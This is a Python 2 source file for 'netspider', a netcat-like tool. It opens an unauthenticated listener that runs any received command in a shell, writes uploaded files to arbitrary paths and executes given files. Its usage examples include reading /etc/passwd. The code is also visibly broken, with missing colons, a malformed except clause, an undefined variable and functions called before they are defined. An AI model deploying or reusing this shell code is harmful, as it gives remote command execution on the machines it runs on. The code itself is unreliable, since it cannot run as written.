import sys 
import socket
import getopt
import threading
import subprocess

#define global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():

	print "/" * 47
	print ("/"*7) +  "Net tool, credits go to @arachna." + ("/" * 7)
	print ("/" * 4)
	
	print
	print

	print "Usage: netspider.py -t [the target host] -p [the target port]"
	print "Bonus arguments:"
	print
	
	print "-l				listen on [host]:[port] for incoming connections"

	print "-e=[target_file_to_exec]	execute the given file upon receiving a connection"
	
	print "-c				initialize a command shell"
	
	print "-u=[target_destination]   	upon receiving a connection upload a file and write to the destination given"
	
	print	
	print "Example usage: "
	print "netspider.py -t 192.168.1.1 -p 6969 -l -c"
	print "netspider.py -t 192.168.1.1 -p 6969 -l -u=c:\\targetdestination"
	print "netspider.py -t 192.168.1.1 -p 6969 -l -e=\"cat /etc/passwd/\""
	print "echo 'ASDFGHJKL' | netspider.py -t 192.168.1.1 -p 6969"
	sys.exit(0)

def main():
	#the global variables	
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	#check if user passed in any arguments
	#if not, call the usage() function	
	if not len(sys.argv[1:])
		usage()
	
	#check the validity of the entered command line arguments
	try: 	
		opts, args = getopt.getopt(sys.argv[1:], "h:l:e:t:p:c:u",
		["help", "listen", "execute", "target", "port", "command", "upload"])
	except:
		getopt.Getopterror as err:
			print str(err)
			usage()
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
		elif opt in ("-l", "--listen"):
			listen = True
		elif opt in ("-e", "--execute"):
			execute = arg
		elif opt in ("-c", "--commandshell"):
			command = True
		elif opt in ("-u", "--upload"):
			upload_destination = arg
		elif opt in ("-t", "--target"):
			target = arg
		elif opt in ("-p", "--port"):	
			port = int(a)
		else:
			assert False, "invalid option"

#listen or just send data from stdin?
if not listen and len(target) and port > 0:
	#read the buffer from the command line
	#sending stdin info
	#CTRL+D to stop the stdin read
	buffer = sys.stdin.read()
	#send the data
	client_sender(buffer)

	#we are going to listen for incoming connections
	#and can use any other flags
	if listen:
		server_loop()
main()
	
def client_sender(buffer):
	
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the target host
		client.connect((target, port))
		
		if len(buffer):
			client.send(buffer)
		#wait for incoming data, and send it off		
		while True:
			recv_len = 1
			response = ""
			
			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data
				if recv_len < 4096
					break
			print response,
			
			#wait for more input
			buffer = raw_input("")
			buffer += "\n"

			#then send it off
			client.send(buffer)
	except:
		print "[*] Detected exception! Now exiting."
		
		#close the connection
		client.close()

#main server loop
def server_loop():
	global target
	
	#if no target is entered
	#we listen to all interfaces
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)

	#client handling thread	
	while True:
		client_socket, addr = server.accept()
		client_thread = threading.Thread(target=client_handler,
		args=(client_socket,))
		
		client_thread.start()

#  -e flag functionality
def run_command(command):
	#trim the newline	
	command = command.rstrip()
	#run the command, get the output
	try:
		output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"
	#give the output to the client	
	return output 			

#rest of the logic for the functions
def client_handler(client_socket):
	global upload
	global execute
	global command

	#check if an upload destination was entered
	if len(upload_destination):
	  #read all the data in the uploaded file		
		file_buffer = ""
		#keep reading data until there is no more
		while True:		
			data = client_socket.recv(1024)
			if not data:
				break
			else:
				file_buffer += data
	  #upload it to the destination
		try:
			target_file = open(upload_destination, "wb")
			target_file.write(file_buffer)
			target_file.close()
		except:
			client_socket.send("Failed to write to target file: %s\r\n" % (upload_destination))

	# -e flag, checking if a command was entered
	if len(execute):
		#run the command
		output = run_command(execute)
		client_socket.send(output)
	
	#if a command shell was requested(-c)
	if command:
		
		while True:
			#display our prompt
			client_socket.send("<netSpider:#>")
			#now we receive until an enter key is pressed
			cmd_buffer = ""
			while "\n" not in cmd_buffer:		
				cmd_buffer += client_socket.recv(1024)
			#execute the command after ENTER is pressed
			response = run_command(cmd_buffer)
			#display the output
			client_socket.send(response)







	
	

